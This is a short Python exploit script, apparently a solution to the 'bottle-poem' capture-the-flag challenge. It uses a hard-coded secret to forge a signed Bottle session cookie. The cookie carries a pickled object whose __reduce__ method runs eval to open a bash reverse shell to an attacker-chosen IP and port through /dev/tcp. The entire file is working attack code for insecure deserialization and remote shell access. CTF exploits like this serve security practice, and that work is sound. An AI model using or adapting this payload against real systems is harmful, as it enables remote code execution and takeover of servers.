import bottle
import requests

url='http://bottle-poem.ctf.sekai.team/sign'
secret = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

# Exploit class to be serialized
class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").popen("bash -c \'bash -i >& /dev/tcp/<ip>/<port> 0>&1\'")',))

exp = bottle.cookie_encode(
    ('session', {"name": [Exploit()]}),
    secret
)

print(exp)

